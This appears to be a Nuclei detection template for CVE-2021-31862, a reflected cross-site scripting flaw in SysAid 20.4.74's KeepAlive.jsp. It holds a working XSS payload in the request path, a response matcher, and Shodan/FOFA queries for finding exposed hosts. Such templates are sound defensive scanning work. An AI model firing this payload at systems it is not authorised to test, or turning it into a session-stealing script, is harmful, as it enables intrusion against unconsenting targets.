id: CVE-2021-31862

info:
  name: SysAid 20.4.74 - Cross-Site Scripting
  author: jas37
  severity: medium
  description: SysAid 20.4.74 contains a reflected cross-site scripting vulnerability via the KeepAlive.jsp stamp parameter.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to execute malicious scripts in the context of the victim's browser, potentially leading to session hijacking, defacement, or theft of sensitive information.
  remediation: |
    Upgrade to a patched version of SysAid or apply the vendor-provided security patch to mitigate the XSS vulnerability.
  reference:
    - https://github.com/RobertDra/CVE-2021-31862/blob/main/README.md
    - https://www.sysaid.com/product/on-premise/latest-release
    - https://nvd.nist.gov/vuln/detail/CVE-2021-31862
    - https://github.com/ARPSyndicate/cvemon
    - https://github.com/ARPSyndicate/kenzer-templates
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2021-31862
    cwe-id: CWE-79
    epss-score: 0.41302
    epss-percentile: 0.97311
    cpe: cpe:2.3:a:sysaid:sysaid:20.4.74:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: sysaid
    product: sysaid
    shodan-query: http.favicon.hash:1540720428
    fofa-query: icon_hash=1540720428
  tags: cve2021,cve,xss,sysaid

http:
  - method: GET
    path:
      - '{{BaseURL}}/KeepAlive.jsp?stamp=%3Cscript%3Ealert(document.domain)%3C/script%3E'

    matchers:
      - type: dsl
        dsl:
          - '(body == "false <script>alert(document.domain)</script>")'
          - 'status_code == 200'
        condition: and
# digest: 4a0a00473045022029510368ed4e542eb266f3bb3286ff184cf6bf46fdd82edf6a7354027365e6e7022100f2b4b54df6c358cc47b7217a740c74345da86d3e684039c69fb68ec7e4d34ad8:922c64590222798bb761d5b6d8e72950